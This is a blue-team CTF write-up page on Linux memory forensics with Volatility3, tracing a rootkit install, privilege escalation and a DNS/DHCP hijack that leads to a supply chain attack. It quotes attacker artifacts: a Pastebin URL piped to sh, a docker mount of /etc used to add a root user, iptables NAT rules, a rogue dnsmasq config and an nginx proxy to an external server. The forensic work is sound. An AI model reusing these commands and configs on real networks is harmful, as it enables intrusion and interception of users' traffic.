@@ -1,0 +1,528 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <meta name="robots" content="index, follow">
+    <title>Holmes CTF 2025 - Hexicon Archives</title>
+    <link rel="icon" type="image/x-icon" sizes="500x500" href="../favicon.png">
+    <link rel="stylesheet" href="../style.css">
+    <link rel="canonical" href="https://hexphased.github.io/hexicon-archives/ctfs/{{CTF_NAME}}.html" />
+    <!-- CTF-specific metadata for SEO -->
+    <meta name="description" content="Detailed writeup for the Holmes CTF 2025 CTF event (HTB platform).">
+    <meta name="keywords" content="CTF, Holmes CTF 2025, HTB, writeup, cybersecurity, penetration testing, Hexicon">
+</head>
+<body>
+    <header>
+        <div class="container header-content">
+            <a href="../ctfs.html" class="logo">CTF Writeups</a>
+            <div class="header-controls">
+                <a href="../index.html" class="htb-icon" title="Link to the main page">
+                    <img src="../favicon.png" alt="Archive" width="30" height="30">
+                </a>
+            </div>
+        </div>
+    </header>
+    
+    <div class="sidebar">
+        <!-- Sidebar now uses platforms instead of difficulties -->
+        <div class="platform-buttons">
+            <button class="platform-btn" data-platform="htb">HackTheBox</button>
+            <div class="ctf-list" id="htb-ctfs">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="platform-btn" data-platform="thm">TryHackMe</button>
+            <div class="ctf-list" id="thm-ctfs">
+                <!-- Will be populated dynamically -->
+            </div>
+            
+            <button class="platform-btn" data-platform="other">Other</button>
+            <div class="ctf-list" id="other-ctfs">
+                <!-- Will be populated dynamically -->
+            </div>
+        </div>
+    </div>
+    
+    <div class="backdrop"></div>
+    
+    <main class="container writeup-content">
+        <h1 class="writeup-title">Holmes CTF 2025</h1>
+        <div class="writeup-metadata">
+            <span class="platform htb">HTB</span>
+            <span class="date">22 Sep 2025, 15:00-26 Sep, 21:00</span>
+        </div>
+        
+        <div class="writeup-container">
+            <div class="writeup-body">
+                <!-- CTF-specific content goes here -->
+                <h1>Intro</h1>
+<p>From September 22nd to September 26th, 2025 (15:00-21:00), I took part in a blue-team CTF competition on HackTheBox: Holmes CTF 2025.</p>
+<p>There were 5 challenge sets in total. Two easy, one medium, and two hard. The challenges required diverse knowledge across DFIR, memory analysis, SOC, and reverse engineering.</p>
+<p>I played with a team and picked one of the hard challenges: <code>The Tunnel Without Walls</code>, a memory analysis challenge.</p>
+<p>Rather than presenting a sanitized walkthrough, I'll show you my actual solving process, including the methodical approach of tackling other questions when stuck, and how taking a step back sometimes reveals what was hiding in plain sight.</p>
+<p>The challenge consisted of 10 questions analyzing a memory dump, ranging from basic system information to uncovering a sophisticated privilege escalation and supply chain attack.</p>
+<h1>Getting Started</h1>
+<p>Before even starting, I encountered my first issue: my own WiFi connection. My download speed oscillated between as low as 16KB/s and no higher than 100KB/s.</p>
+<p><img alt="Damn you internet!" src="../images/ctfs/holmes-ctf-2025/download.png" /></p>
+<p>Downloading almost 1GB of challenge files wasn't going to happen like this, so I needed to think around the problem.</p>
+<p>I hadn't used Google Colab in ages, but I remembered it helping me a lot back when I was into AI generation. Plus, Google Colab runs on a Unix-like system, which would play well with this Linux-based challenge (judging by the questions).</p>
+<p>The setup was straightforward: <code>wget</code> the challenge files, <code>git clone</code> Volatility, and use Colab's built-in terminal. I saved important commands in code cells to avoid losing my work if the session timed out.</p>
+<h1>Downloading and finishing the setup</h1>
+<p>I set up a code cell that would download the challenge archive and rename it to a manageable name:</p>
+<pre class="codehilite"><code class="language-bash">file = &quot;https://ctf.hackthebox.com/challenges/58398/download?expires=...&quot;
+!wget &quot;{file}&quot;
+</code></pre>
+
+<pre class="codehilite"><code class="language-bash">!mv '&lt;challenge&gt;' 'challenge.zip'
+!ls -la
+</code></pre>
+
+<p><img alt="challenge" src="../images/ctfs/holmes-ctf-2025/challenge.png" /></p>
+<p>Once I had the memory dump downloaded, it was time to dive in.</p>
+<h1>Q1</h1>
+<pre class="codehilite"><code>What is the Linux kernel version of the provided image? (string)
+</code></pre>
+
+<p>I began by unzipping the archive. The code cells were very useful for performing a few actions in succession, especially when I didn't know how long each task would take.</p>
+<p>Besides that, an active code cell would keep the Colab session from shutting down due to inactivity, which could definitely cause issues later in the challenge.</p>
+<p><img alt="unzip" src="../images/ctfs/holmes-ctf-2025/unzip.png" /></p>
+<p>This revealed a ~4GB memory dump file. I immediately followed up by cloning the volatility3 repo from GitHub:</p>
+<p><img alt="volatility" src="../images/ctfs/holmes-ctf-2025/volatility.png" /></p>
+<p><code>git clone https://github.com/volatilityfoundation/volatility3.git</code></p>
+<h2>Exploring the volatility3 modules</h2>
+<p>Volatility3 has a ton of useful commands for Windows/Linux/Mac. However, some might not show up when you supply an invalid module name.</p>
+<p>This is because when an incorrect module is supplied, volatility outputs a list of modules with similar names. For example, when trying to use a module named <code>lin</code>, all modules starting with <code>Linux</code> will be shown.</p>
+<p><img alt="modules1" src="../images/ctfs/holmes-ctf-2025/modules1.png" /></p>
+<p>However, there's also a single non-OS bound module <code>timeliner.Timeliner</code>, and three Windows modules that happen to contain the <code>lin</code> string within their names.</p>
+<p>A much quicker and simpler way is to use the <code>--help</code> switch to get a full list of available modules.</p>
+<p><img alt="banner" src="../images/ctfs/holmes-ctf-2025/banner.png" /></p>
+<p>The first module shown will attempt to find Linux banners in the provided memdump. A banner like that would contain the OS name and the kernel version.</p>
+<p><code>python volatility3/vol.py -f memdump.mem banners</code></p>
+<p><img alt="banners" src="../images/ctfs/holmes-ctf-2025/banners.png" /></p>
+<p>Volatility3 successfully found banner information within the memory dump. <code>Linux version 5.10.0-35-amd64</code> means the victim's computer was running Linux with kernel version <code>5.10.0-35-amd64</code>.</p>
+<p><strong>Answer: <code>5.10.0-35-amd64</code></strong></p>
+<h1>Q2</h1>
+<pre class="codehilite"><code>The attacker connected over SSH and executed initial reconnaissance commands. What is the PID of the shell they used? (number)
+</code></pre>
+
+<p>The first module I wanted to use after moving to Q2 was <code>linux.pslist.PsList</code>. This would return a list of processes captured in the memory dump, which would help tremendously with pinpointing the attacker's actions.</p>
+<p>However, this is where I ran into my second roadblock.</p>
+<p><img alt="symbols" src="../images/ctfs/holmes-ctf-2025/symbols.png" /></p>
+<p>Modules like pstree or pslist wouldn't run at all, displaying this error message instead. I could safely dismiss the first requirement, as I knew there was definitely a file being passed.</p>
+<p>The second requirement though had me stumped. While I was somewhat familiar with volatility3, I'd never encountered an error related to <code>symbol tables</code> and frankly, I didn't have a clue what they were.</p>
+<p>I did the only thing I knew to do whenever I got stuck... took keywords, researched, and eventually got the issue down to a manageable level.</p>
+<h2>Learning about the symbol tables</h2>
+<p>Volatility3 has to know how to walk through the memory dump. In order to do so, it needs information about the OS it came from, specifically, how data structures are laid out in memory for that particular kernel version.</p>
+<p>This is solved by symbol tables. JSON files that contain the memory layout information for specific kernel versions. Without these, Volatility can't interpret the raw memory data correctly.</p>
+<p>The problem? This error indicates that there are no symbol tables for the Linux kernel version from this memory dump. Luckily, I found an article explaining how to create specific symbol tables.</p>
+<p><code>https://volatility3.readthedocs.io/en/latest/symbol-tables.html</code></p>
+<p>I already had the kernel version from the <code>banners</code> module output, so I searched the web for its debug symbols package:</p>
+<p><code>http://security.debian.org/debian-security/pool/updates/main/l/linux/linux-image-5.10.0-35-amd64-dbg_5.10.237-1_amd64.deb</code></p>
+<p>While at it, I also downloaded the <code>dwarf2json</code> binary to create the necessary JSON file:</p>
+<p><code>https://github.com/volatilityfoundation/dwarf2json</code></p>
+<p><img alt="image" src="../images/ctfs/holmes-ctf-2025/image.png" /></p>
+<p>Now I had everything necessary to create the missing symbol table.</p>
+<h2>Creating the symbol table</h2>
+<p>First, I unpacked the .deb package with <code>dpkg</code>. It contains the uncompressed kernel file <code>vmlinux</code> in an ELF format. This file will be used to create the symbol table.</p>
+<p><code>dpkg -x 'linux-image-5.10.0-35-amd64-dbg_5.10.237-1_amd64.deb' extracted_package</code></p>
+<p><img alt="dpkg" src="../images/ctfs/holmes-ctf-2025/dpkg.png" /></p>
+<p>Dwarf2json can create symbol tables for Mac and Linux, and will accept the ELF file if the --elf flag is specified.</p>
+<p><code>./dwarf2json-linux-amd64 linux --elf extracted_package/usr/lib/debug/boot/vmlinux-5.10.0-35-amd64 &gt; table.json</code></p>
+<p>I directed the output to a different file because by default, dwarf2json will return it straight to stdout, which means right back into the terminal.</p>
+<p><img alt="dwarf" src="../images/ctfs/holmes-ctf-2025/dwarf.png" /></p>
+<p>The file had to be placed in the correct directory. Under <code>volatility3/volatility3/symbols</code> there was no Linux directory, so I created one, and moved table.json into that directory.</p>
+<p><img alt="directory" src="../images/ctfs/holmes-ctf-2025/directory.png" /></p>
+<p>With everything in place, I reran the pslist module once again, expecting it to work correctly.</p>
+<p><img alt="work" src="../images/ctfs/holmes-ctf-2025/work.png" /></p>
+<h2>Finding the suspicious process</h2>
+<p>Looking at the output, I could see a suspicious process chain starting from PID 13607.</p>
+<p><img alt="suspicious" src="../images/ctfs/holmes-ctf-2025/suspicious.png" /></p>
+<p>There's an sshd process (PID 13607) that spawns a bash process (PID 13608), which then spawns a su process (PID 20703), and that process spawns another bash process (PID 22714).</p>
+<p>The transition from sshd to bash suggests that a shell was established, and the following su/bash chain looks like a privilege escalation attempt. The first bash process after SSH connection would be the attacker's initial shell.</p>
+<p><strong>Answer: <code>13608</code></strong></p>
+<h1>Q3 - Part 1</h1>
+<pre class="codehilite"><code>After the initial information gathering, the attacker authenticated as a different user to escalate privileges.
+Identify and submit that user's credentials. (user:password)
+</code></pre>
+
+<p>In order to see the attacker-used user, I ran the linux.bash volatility3 module. This will display all commands executed via the bash shell captured within this memory dump.</p>
+<p><code>python volatility3/vol.py -f memdump.mem linux.bash</code></p>
+<p><img alt="bash" src="../images/ctfs/holmes-ctf-2025/bash.png" /></p>
+<p>I can see someone authenticating as the user <code>jm</code> using su, with PID 13608, which correlates with the attacker's shell PID. If this user exists, their credentials should be stored in the <code>/etc/shadow</code> file of the victim's filesystem.</p>
+<p>Volatility3 has a module named <code>linux.pagecache.RecoverFs</code>, which allows for recovery of the host's filesystem using only the memory dump.</p>
+<p><img alt="recover" src="../images/ctfs/holmes-ctf-2025/recover.png" /></p>
+<p>After ~15 minutes, the process was done, and a compressed recovered_fs.tar.gz directory was created. I extracted it into a new <code>recovered_fs</code> directory.</p>
+<p><code>tar -xvf recovered_fs.tar.gz -C recovered_fs</code></p>
+<p><img alt="mess" src="../images/ctfs/holmes-ctf-2025/mess.png" /></p>
+<p>The result was a bunch of directories with GUID-like names. I can look into all of them at once by using a <code>*</code> character instead of the directory name.</p>
+<h2>The Invisible Root Mystery</h2>
+<p><code>cat recovered_fs/*/etc/shadow</code></p>
+<p>As a result of the above command, each directory found under recovered_fs will be searched, and every <code>/etc/shadow</code> file found within will be displayed.</p>
+<p><img alt="surprise" src="../images/ctfs/holmes-ctf-2025/surprise.png" /></p>
+<p>To my surprise, the <code>jm</code> user was not present in the <code>/etc/shadow</code> file. I was dumbfounded at this point, and couldn't imagine how the attacker could add an arbitrary user without touching <code>/etc/shadow</code>.</p>
+<p>I decided to leave this question for now and try to solve the others. As it would turn out later, I had missed a pretty obvious clue that would surely lead me to the answer.</p>
+<h1>Q4</h1>
+<pre class="codehilite"><code>The attacker downloaded and executed code from Pastebin to install a rootkit.
+What is the full path of the malicious file? (/path/filename.ext)
+</code></pre>
+
+<p>I had already seen the pastebin link earlier, in the linux.bash module output.</p>
+<p><code>https://pastebin.com/raw/hPEBtinX|sh</code></p>
+<p>The link itself is unavailable, and it wasn't archived on the wayback machine. However, the question itself gives a few important hints.</p>
+<p>First, the result was immediately piped to sh. There would be no .sh files left on the filesystem for me to analyze, as none were created.</p>
+<p>Second, I'm searching for a rootkit. Rootkits on Linux usually come as .ko (kernel object) files, because they are compiled kernel objects that can be loaded/removed on the fly.</p>
+<p>For an uncompiled rootkit or its source code, I would search for a .c file. However, since it had been installed, it will most likely be a .ko file, located somewhere within the system's <code>/lib</code> directory.</p>
+<h2>Using volatility's rootkit detection modules</h2>
+<p><code>linux.lsmod.Lsmod</code> outputs all kernel modules that have been loaded when this memory dump was taken.</p>
+<p><code>python volatility3/vol.py -f memdump.mem linux.lsmod.Lsmod</code></p>
+<p><img alt="module" src="../images/ctfs/holmes-ctf-2025/module.png" /></p>
+<p>There is only a single unsigned module, and it was the one used to create this memory dump. It is most likely <em>not</em> the target rootkit.</p>
+<p>Depending on what kind of rootkit it is, it might be able to "hide" itself from detection. From what I understand, rootkits can employ various techniques like unlinking themselves from kernel module lists, hooking system calls to tamper with data returned to detection tools, or modifying kernel structures to remain invisible.</p>
+<p>Since <code>lsmod</code> didn't show any obvious malicious modules, I was tempted to look for the rootkit file directly on the filesystem rather than relying on kernel module enumeration. However, I quickly discarded that idea.</p>
+<p>There are many legitimate modules in the filesystem, and manually looking through all of them would be like searching for a needle in a haystack. Instead, I reached for a different volatility module that can find hidden kernel modules by directly carving memory.</p>
+<p><code>python volatility3/vol.py -f memdump.mem linux.hidden_modules.Hidden_modules</code></p>
+<p><img alt="nullinc" src="../images/ctfs/holmes-ctf-2025/nullinc.png" /></p>
+<p>This is promising! It found a different unsigned module named <code>Nullincrevenge</code></p>
+<p>I have never heard about this module before, and I could not find anything about it online.</p>
+<p><img alt="rootkit" src="../images/ctfs/holmes-ctf-2025/rootkit.png" /></p>
+<p>This confirms that Nullincrevenge exists within the filesystem. Now I just had to find the full path of this kernel object file.</p>
+<p><code>find recovered_fs -name "Nullincrevenge.ko"</code></p>
+<p>The full path of this rootkit is <code>/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko</code>. I wasn't sure what the GUID-like strings were at this point (my best guess was Docker containers), but it seemed safe to strip them from the answer.</p>
+<p>Indeed, <code>/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko</code> was the correct answer.</p>
+<h1>Q5</h1>
+<pre class="codehilite"><code>What is the email account of the alleged author of the malicious file? (user@example.com)
+</code></pre>
+
+<p>Before trying to find the rootkit's author online, I quickly ran strings against the malware, searching for the one character that always appears in emails: the <code>@</code> symbol.</p>
+<p><code>strings recovered_fs/92931307-c5fd-4804-94f2-a8287e677bd6/usr/lib/modules/5.10.0-35-amd64/kernel/lib/Nullincrevenge.ko | grep '@'</code></p>
+<p><img alt="strings" src="../images/ctfs/holmes-ctf-2025/strings.png" /></p>
+<p>And this worked! The author's email was embedded within the rootkit, and it was the correct answer to question 5.</p>
+<h1>Q6</h1>
+<pre class="codehilite"><code>The next step in the attack involved issuing commands to modify the network settings and installing a new package.
+What is the name and PID of the package? (package name,PID)
+</code></pre>
+
+<p>I went back to the <code>linux.bash</code> output, and looked at what happened after the privilege escalation to jm.</p>
+<p><img alt="bash1" src="../images/ctfs/holmes-ctf-2025/bash1.png" /></p>
+<p>There are quite a few suspicious networking-related commands here. First, by running <code>sysctl --system</code>, the attacker is loading system configuration - likely enabling IP forwarding (<code>net.ipv4.ip_forward=1</code>), though this is speculation.</p>
+<p>The iptables rules that follow are more telling:</p>
+<ul>
+<li>
+<p><code>iptables -A FORWARD -i ens224 -o ens192 -j ACCEPT</code> - Allows traffic coming from ens224 to be forwarded out through ens192</p>
+</li>
+<li>
+<p><code>iptables -A FORWARD -i ens192 -o ens224 -m state --state ESTABLISHED,RELATED -j ACCEPT</code> - Allows return traffic to come back from ens192 to ens224  </p>
+</li>
+<li>
+<p><code>iptables -t nat -A POSTROUTING -s 192.168.211.0/24 -o ens192 -j MASQUERADE</code> - This NAT rule masquerades (hides the real source IP) for traffic from the 192.168.211.0/24 network going out through ens192</p>
+</li>
+</ul>
+<p>By creating these rules, the attacker created a seamless tunnel between the victims on subnet <code>192.168.211.0/24</code>, and whatever is waiting for the traffic sent through the ens192 adapter on the compromised machine, essentially turning it into a malicious proxy.</p>
+<p>Next, they installed dnsmasq and created a new configuration file, before restarting it to apply the new configuration. The answer to this question is most definitely dnsmasq, so I looked into <code>pslist</code> once again, filtering the results for its appearance.</p>
+<p><code>python volatility3/vol.py -f memdump.mem linux.pslist.PsList | grep dnsmasq -C 5</code></p>
+<p><img alt="dnsmasq" src="../images/ctfs/holmes-ctf-2025/dnsmasq.png" /></p>
+<p>The only process related to dnsmasq has PID 38687. </p>
+<p><strong>Answer: <code>dnsmasq,38687</code></strong></p>
+<h1>Q7</h1>
+<pre class="codehilite"><code>Clearly, the attacker's goal is to impersonate the entire network. One workstation was already tricked and got its new malicious network configuration.
+What is the workstation's hostname?
+</code></pre>
+
+<p>I knew the exact location of the attacker's dnsmasq config. It was located in <code>/etc/dnsmasq.conf</code>, so I analyzed it first before doing anything else.</p>
+<pre class="codehilite"><code>interface=ens224
+
+dhcp-range=192.168.211.30,192.168.211.240,1h
+dhcp-option=3,192.168.211.8
+dhcp-option=6,192.168.211.8
+
+no-hosts
+no-resolv
+server=8.8.8.8
+address=/updates.cogwork-1.net/192.168.211.8
+
+log-queries=no
+quiet-dhcp
+quiet-dhcp6
+log-facility=/dev/null
+</code></pre>
+
+<p>This configuration file answers a few questions related to the attacker's goals, and sheds light on what they tried to do here:</p>
+<ul>
+<li><code>interface=ens224</code> - Dnsmasq runs on the ens224 interface, the internal network on which regular workstations operate. It will hand out DHCP leases as specified in the dhcp-range option.</li>
+<li><code>dhcp-option=3,192.168.211.8</code> - DHCP option 3 is used to specify a default gateway for DHCP clients on the networks. In this case, the default gateway will be the compromised machine.</li>
+<li><code>dhcp-option=6,192.168.211.8</code> - DHCP option 6 specifies a DNS server. Once again, it sets the compromised machine as the DNS server.</li>
+<li><code>address=/updates.cogwork-1.net/192.168.211.8</code> - This is a huge red flag. Any request headed towards <code>updates.cogwork-1.net</code> will instead be redirected back to the compromised machine itself.</li>
+</ul>
+<p>The attacker also disabled logging completely to cover their tracks.</p>
+<h2>Exploring remaining dnsmasq artifacts</h2>
+<p>In the question, there was a mention of a workstation that had received the malicious network configuration. What I understood from this is that a workstation had received an address from the compromised machine.</p>
+<p>This should be reflected in dnsmasq logs, but the attacker had effectively gotten rid of them. I searched for files related to dnsmasq within the recovered_fs directory to see what I could look into.</p>
+<p><code>find recovered_fs/* -name dnsmasq*</code></p>
+<p><img alt="dnsmasqfiles" src="../images/ctfs/holmes-ctf-2025/dnsmasqfiles.png" /></p>
+<p>The <code>dnsmasq.leases</code> file was still there and it was exactly what I needed. If a machine had received an IP from the DHCP server, it would 100% be listed in this file.</p>
+<p><img alt="paralla" src="../images/ctfs/holmes-ctf-2025/parallax.png" /></p>
+<p><code>192.168.211.52 Parallax-5-WS-3</code></p>
+<p>Perfect! The workstation Parallax-5-WS-3 received an IP of 192.168.211.52 from the compromised machine.</p>
+<p><strong>Answer: <code>Parallax-5-WS-3</code></strong></p>
+<h1>Q8</h1>
+<pre class="codehilite"><code>After receiving the new malicious network configuration, the user accessed the City of CogWork-1 internal portal from this workstation.
+What is their username? (string)
+</code></pre>
+
+<p>The attacker's last actions on this machine were creating a default.conf file and running nginx in Docker on the host network with this very config file. I checked whether this file was still available, since I saw the attacker trying to delete it.</p>
+<p><img alt="ngings" src="../images/ctfs/holmes-ctf-2025/nginx.png" /></p>
+<p>This is all coming together nicely. The nginx container is set to listen on port 80 (web) of the compromised machine, turning it into a malicious proxy.</p>
+<p>Everything arriving on port 80 on this host gets forwarded to <code>http://13.62.49.86:7477/</code> instead, with an added header of <code>Host: jm_supply</code> to make it appear legitimate.</p>
+<p>However, right now I was looking for the tricked user's credentials. The full attack chain will be explained at a later step.</p>
+<h2>Looking for POST form credentials with grep</h2>
+<p>Since the POST request that the user submitted would pass through nginx at port 80, I wanted to check the web server's logs.</p>
+<p>While I initially found nginx's log directory...</p>
+<p><img alt="log" src="../images/ctfs/holmes-ctf-2025/log.png" /></p>
+<p>Both files were redirected to stderr/stdout, making this discovery ultimately useless.</p>
+<p><img alt="redirect" src="../images/ctfs/holmes-ctf-2025/redirected.png" /></p>
+<p>This was the second time I was close to running out of options, but I still had one thing to try: running <code>strings</code> against the memory dump itself. Data can persist in memory even after logs are cleared and programs are deleted.</p>
+<p>Knowing how credentials look in a typical POST request, I crafted a simple regex using grep to search for both <code>username=</code> and <code>password=</code>.</p>
+<p>This requires the <code>-E</code> flag in grep, which enables extended regular expressions. This treats the pipe character as OR, making it search for both patterns simultaneously.</p>
+<p><code>strings memdump.mem | grep -E "username=|password="</code></p>
+<p><img alt="creds" src="../images/ctfs/holmes-ctf-2025/creds.png" /></p>
+<p>Only Mike's credentials were found, with the identical request repeated 2 additional times.</p>
+<p><strong>Answer: <code>mike.sullivan</code></strong></p>
+<h1>Q9</h1>
+<pre class="codehilite"><code>Finally, the user updated a software to the latest version, as suggested on the internal portal, and fell victim to a supply chain attack.
+From which Web endpoint was the update downloaded?
+</code></pre>
+
+<p>Now we move to the final phase of the attack, the actual supply chain compromise. Since I knew the victim's IP address, I used a recursive grep against the recovered_fs directory to search for the IP string.</p>
+<p><code>grep -r "192.168.211.52"  recovered_fs/*</code></p>
+<p><img alt="docker" src="../images/ctfs/holmes-ctf-2025/docker.png" /></p>
+<p>The answer was quickly found in the logs of a docker container. Seeing as the memdump also matched, I could've just used strings on it like in the previous task to find the same answer.</p>
+<p><img alt="string" src="../images/ctfs/holmes-ctf-2025/string.png" /></p>
+<p><strong>Answer: <code>/win10/update/CogSoftware/AetherDesk-v74-77.exe</code></strong></p>
+<h1>Q10</h1>
+<pre class="codehilite"><code>To perform this attack, the attacker redirected the original update domain to a malicious one.
+Identify the original domain and the final redirect IP address and port. (domain,IP:port)
+</code></pre>
+
+<p>This can be answered without much more analysis. I had every bit of knowledge I needed to solve this after answering almost every other question.</p>
+<p>The original domain was found in the dnsmasq.conf file:</p>
+<p><code>address=/updates.cogwork-1.net/192.168.211.8</code></p>
+<p>And it was <code>updates.cogwork-1.net</code>. The next part, the final IP/port of the malicious server, was found in the nginx config within <code>/tmp/default.conf</code>:</p>
+<p><code>proxy_pass http://13.62.49.86:7477/;</code></p>
+<p>The server which distributed the malicious file was located at <code>13.62.49.86:7477</code></p>
+<p><strong>Answer: <code>updates.cogwork-1.net,13.62.49.86:7477</code></strong></p>
+<p>And while this <em>was</em> technically the last question... I still had one unsolved. Question 3.</p>
+<h1>Q3 - Part 2</h1>
+<p>Back at question 3, I decided to look through the <code>linux.bash</code> output again.</p>
+<p><img alt="jm" src="../images/ctfs/holmes-ctf-2025/jm.png" /></p>
+<p>I looked at the bash module output once again, and this time, the Docker command caught my attention.</p>
+<p>Let me break down what it does:</p>
+<p><code>docker run -v /etc/:/mnt -it alpine</code></p>
+<p>The attacker mounted the host's <code>/etc</code> directory inside the container at <code>/mnt</code>. With <code>-it</code>, they gained an interactive terminal on the container.</p>
+<p>I decided to use a recursive grep in the container directories to find any mention of <code>jm</code>.</p>
+<p><img alt="etc" src="../images/ctfs/holmes-ctf-2025/etc.png" /></p>
+<p>And this revealed just how close I was to solving the question earlier. In the container's <code>/mnt</code> directory, which was actually the mounted <code>/etc</code> directory of the host, the attacker had added a new root user into the <code>/etc/passwd</code> file.</p>
+<p><img alt="password" src="../images/ctfs/holmes-ctf-2025/password.png" /></p>
+<p>Bingo! The elusive root user <em>JM</em> was created here, and used by the attacker for privilege escalation.</p>
+<p>This is just an MD5 hash, so cracking it should not be too hard. I'll need a tool to do that though, and I decided to go with John the Ripper this time. I also downloaded rockyou.txt to increase my chances of cracking the hash (let's hope Google won't ban me for this).</p>
+<p><code>john hash -w=rockyou.txt</code></p>
+<p><img alt="cracked" src="../images/ctfs/holmes-ctf-2025/cracked.png" /></p>
+<p>The hash cracked, revealing the credential pair of <code>jm:WATSON0</code></p>
+<p><strong>Answer: <code>jm:WATSON0</code></strong></p>
+<h1>Final words</h1>
+<p>I really liked this challenge! Before I've never actually done a memory analysis challenge based on a Linux-OS, only Windows ones. It was very fun to learn about certain hurdles and new concepts like the symbol tables.</p>
+<p>See you all in the next competition!</p>
+            </div>
+            
+            <div class="toc-sidebar">
+                <h3>Contents</h3>
+                <ul id="toc-list">
+                    <!-- This will be populated by JavaScript -->
+                </ul>
+            </div>
+        </div>
+    </main>
+    
+    <!-- Mobile TOC toggle button -->
+    <button class="toc-toggle" aria-label="Toggle table of contents">
+        ≡
+    </button>
+    
+    <footer>
+        <div class="container">
+            <p>&copy; 2025 Hexicon Archives | Created by Hexicon</p>
+        </div>
+    </footer>
+
+    <script>
+        // Global variable for CTF metadata
+        let ctfData = {};
+        
+        // Function to initialize the application
+        async function initializeApp() {
+            try {
+                // Fetch CTF metadata from the correct path
+                const response = await fetch('../CTFs.json');
+                if (!response.ok) {
+                    throw new Error('Failed to load CTF metadata');
+                }
+                ctfData = await response.json();
+                
+                populateSidebar();
+                generateTableOfContents();
+
+            } catch (error) {
+                console.error('Initialization error:', error);
+                showError("Failed to initialize application. Please refresh and try again.");
+            }
+        }
+
+        // Populate sidebar with CTF links dynamically
+        function populateSidebar() {
+            const categories = {
+                "htb": document.getElementById("htb-ctfs"),
+                "thm": document.getElementById("thm-ctfs"),
+                "other": document.getElementById("other-ctfs")
+            };
+
+            // Clear existing links
+            for (const category of Object.values(categories)) {
+                category.innerHTML = '';
+            }
+
+            // Add CTF links to appropriate categories
+            for (const [ctfName, data] of Object.entries(ctfData)) {
+                const platform = data.platform.toLowerCase();
+                if (categories[platform]) {
+                    const link = document.createElement('a');
+                    link.href = `../ctfs/${ctfName}.html`; // Corrected path
+                    link.textContent = data.title;
+                    
+                    // Highlight the current CTF in the sidebar
+                    if (data.title === "Holmes CTF 2025") {
+                        link.classList.add('active');
+                    }
+                    
+                    categories[platform].appendChild(link);
+                }
+            }
+        }
+
+        // --- All TOC, Scroll Highlighting, and other UI functions can remain the same ---
+        // --- as they are not dependent on the machine vs. ctf distinction.           ---
+
+        function generateTableOfContents() {
+            const writeupBody = document.querySelector('.writeup-body');
+            const tocList = document.getElementById('toc-list');
+            if (!writeupBody || !tocList) return;
+            const headings = writeupBody.querySelectorAll('h1, h2, h3');
+            tocList.innerHTML = '';
+            
+            headings.forEach((heading, index) => {
+                if (!heading.id) {
+                    const headingText = heading.textContent.trim();
+                    const headingId = headingText.toLowerCase().replace(/[^\w\s-]/g, '').replace(/\s+/g, '-');
+                    heading.id = headingId || `section-${index}`;
+                }
+                
+                const listItem = document.createElement('li');
+                const link = document.createElement('a');
+                link.href = `#${heading.id}`;
+                link.textContent = heading.textContent;
+                
+                if (heading.tagName === 'H2') listItem.style.paddingLeft = '15px';
+                if (heading.tagName === 'H3') listItem.style.paddingLeft = '30px';
+                
+                listItem.appendChild(link);
+                tocList.appendChild(listItem);
+            });
+            setupScrollHighlighting();
+        }
+
+        function setupScrollHighlighting() {
+            const tocLinks = document.querySelectorAll('.toc-sidebar a');
+            const highlightActiveSection = () => {
+                const fromTop = window.scrollY + 120;
+                tocLinks.forEach(link => {
+                    const section = document.querySelector(link.hash);
+                    if (section && section.offsetTop <= fromTop && section.offsetTop + section.offsetHeight > fromTop) {
+                        link.classList.add('active');
+                    } else {
+                        link.classList.remove('active');
+                    }
+                });
+            };
+            window.addEventListener('scroll', highlightActiveSection);
+            highlightActiveSection();
+        }
+
+        function showError(message) {
+            const contentArea = document.querySelector('.writeup-body');
+            contentArea.innerHTML = `<div class="error-message"><h2>Error</h2><p>${message}</p></div>`;
+        }
+
+        document.addEventListener('DOMContentLoaded', function() {
+            initializeApp(); // Call the main async function
+
+            // Hamburger menu functionality
+            const hamburgerMenu = document.querySelector('.hamburger-menu');
+            const sidebar = document.querySelector('.sidebar');
+            const backdrop = document.querySelector('.backdrop');
+            
+            hamburgerMenu.addEventListener('click', () => {
+                hamburgerMenu.classList.toggle('active');
+                sidebar.classList.toggle('active');
+                backdrop.classList.toggle('active');
+            });
+            
+            backdrop.addEventListener('click', () => {
+                hamburgerMenu.classList.remove('active');
+                sidebar.classList.remove('active');
+                backdrop.classList.remove('active');
+                if (tocSidebar) tocSidebar.classList.remove('active');
+            });
+            
+            // Platform buttons functionality (adapted from difficulty buttons)
+            const platformButtons = document.querySelectorAll('.platform-btn');
+            platformButtons.forEach(button => {
+                button.addEventListener('click', () => {
+                    const platform = button.getAttribute('data-platform');
+                    const ctfList = document.querySelector(`#${platform}-ctfs`);
+                    ctfList.classList.toggle('active');
+                });
+            });
+            
+            // Mobile TOC toggle
+            const tocToggle = document.querySelector('.toc-toggle');
+            const tocSidebar = document.querySelector('.toc-sidebar');
+            if (tocToggle && tocSidebar) {
+                tocToggle.addEventListener('click', () => {
+                    tocSidebar.classList.toggle('active');
+                    backdrop.classList.toggle('active');
+                });
+            }
+            
+            document.querySelectorAll('.toc-sidebar a').forEach(link => {
+                link.addEventListener('click', () => {
+                    if (window.innerWidth <= 1024) {
+                        tocSidebar.classList.remove('active');
+                        backdrop.classList.remove('active');
+                    }
+                });
+            });
+        });
+
+        // Add smooth scrolling for TOC links
+        document.addEventListener('click', function(e) {
+            if (e.target.closest('a') && e.target.closest('a').hash) {
+                const link = e.target.closest('a');
+                const element = document.querySelector(link.hash);
+                if (element) {
+                    e.preventDefault();
+                    window.scrollTo({ top: element.offsetTop - 90, behavior: 'smooth' });
+                }
+            }
+        });
+    </script>
+</body>
+</html>
